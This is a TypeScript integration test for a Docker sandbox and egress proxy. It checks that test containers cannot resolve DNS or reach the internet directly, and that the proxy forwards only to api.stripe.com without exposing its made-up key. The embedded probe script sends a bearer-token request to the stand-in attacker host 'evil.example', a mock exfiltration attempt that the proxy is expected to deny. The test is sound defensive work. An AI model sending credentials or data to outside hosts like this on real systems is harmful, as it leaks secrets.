import { execFile } from 'node:child_process';
import { chmod, mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';
import { expect, it } from 'vitest';
import { dockerSandboxArguments } from './docker-sandbox.ts';
import {
  createSandboxNetwork,
  proxyConfig,
  removeSandboxNetwork,
  startProxy,
  writeProxy,
} from './provider-sandbox.ts';
import { STRIPE_TEST_MODE } from './stripe-test-mode.ts';

const execute = promisify(execFile);
const IMAGE = process.env.REFIT_DOCKER_IMAGE;
const gated = it.skipIf(!IMAGE);
// A made-up key: Stripe answers 401, so nothing in any account is read or changed.
const KEY = 'sk_test_refitsandboxegress000';

// What a test container on the sandbox network can reach: only the proxy, and through it only the
// adapter's hosts.
const PROBE = `
const dns = await import('node:dns/promises');
const out = {};
out.dns = await dns.lookup('example.com').then(() => 'resolved', (error) => error.code);
out.direct = await fetch('https://1.1.1.1', { signal: AbortSignal.timeout(5000) }).then(() => 'reached', (error) => error.cause?.code ?? error.name);
const via = (host) => new Promise((resolve) => {
  const req = (globalThis.http).request({ host: process.env.PROXY, port: 8080, path: '/v1/customers', headers: { host, authorization: 'Bearer sk_test_123' } }, (res) => {
    let body = '';
    res.on('data', (chunk) => (body += chunk));
    res.on('end', () => resolve({ status: res.statusCode, body }));
  });
  req.on('error', (error) => resolve({ error: error.code }));
  req.end();
});
globalThis.http = await import('node:http');
out.other = await via('evil.example');
out.stripe = await via('api.stripe.com');
console.log(JSON.stringify(out));
`;

gated(
  'denies DNS and direct egress, and the proxy reaches only the adapter host with the key it holds',
  async () => {
    const tools = await mkdtemp(join(tmpdir(), 'refit-sandbox-'));
    await chmod(tools, 0o755);
    const network = (await createSandboxNetwork(60_000)) as `refit-sandbox-${string}`;
    try {
      await writeProxy(
        tools,
        'original',
        proxyConfig(STRIPE_TEST_MODE, {
          runId: 'refit-docker-test',
          version: '2026-09-30.endive',
          contract: {},
          standIns: [],
        }),
      );
      const proxy = await startProxy({
        network,
        image: IMAGE!,
        tools,
        side: 'original',
        keys: [KEY],
        timeoutMs: 60_000,
      });
      let stdout = '';
      try {
        ({ stdout } = await execute(
          'docker',
          dockerSandboxArguments({
            name: `refit-probe-${Date.now()}`,
            directory: tools,
            image: IMAGE!,
            command: ['sh', '-c', `PROXY=${proxy.host} node --input-type=module -e "$0"`, PROBE],
            network,
            timeoutMs: 60_000,
          }),
          { timeout: 60_000, encoding: 'utf8' },
        ));
      } finally {
        const records = await proxy.stop();
        expect(JSON.stringify(records)).not.toContain(KEY);
        expect(records).toEqual([
          { method: 'GET', path: '/v1/customers', host: 'evil.example', status: 403, denied: true },
          expect.objectContaining({
            host: 'api.stripe.com',
            status: 401,
            version: '2026-09-30.endive',
          }),
        ]);
      }
      const result = JSON.parse(stdout.trim().split('\n').at(-1)!);
      expect(result.dns).not.toBe('resolved');
      expect(result.direct).not.toBe('reached');
      expect(result.other.status).toBe(403);
      // Stripe refused the made-up key; the code under test never saw it.
      expect(result.stripe.status).toBe(401);
      expect(result.stripe.body).not.toContain(KEY);
    } finally {
      await removeSandboxNetwork(network);
      await rm(tools, { recursive: true, force: true });
    }
  },
  120_000,
);
